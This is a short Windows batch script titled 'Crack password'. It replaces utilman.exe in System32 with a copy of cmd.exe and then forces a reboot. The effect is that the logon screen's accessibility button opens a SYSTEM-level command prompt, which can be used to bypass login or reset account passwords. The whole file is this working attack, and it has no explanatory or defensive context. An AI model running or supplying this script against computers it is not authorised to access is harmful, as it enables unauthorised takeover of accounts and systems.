echo off
Title Crack password
c:
cd windows/system32
ren utilman.exe utilman_backup.exe
copy cmd.exe utilman.exe
wmic os where Primary='TRUE' reboot